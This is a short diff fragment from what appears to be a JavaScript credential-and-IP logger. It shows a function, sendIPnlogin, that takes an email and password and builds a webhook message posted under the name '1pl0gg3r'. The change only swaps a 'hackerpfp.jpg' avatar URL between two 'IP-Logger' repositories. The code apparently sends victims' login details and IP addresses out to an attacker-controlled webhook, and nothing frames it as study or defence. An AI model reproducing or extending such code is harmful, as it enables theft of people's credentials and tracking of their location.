@@ -22,7 +22,7 @@ const sendIPnlogin = (email = 'unknown', password = 'unknown') => {
                         },
                         body: JSON.stringify({
                             username: "1pl0gg3r", // optionally changeable
-                            avatar_url: "https://armitha-cyber.github.io/IP-Logger/hackerpfp.jpg", // optionally changeable
+                            avatar_url: "https://armed0ps.github.io/IP-Logger-new/hackerpfp.jpg", // optionally changeable
                             content: `@everyone`,
                             embeds: [
                                 {
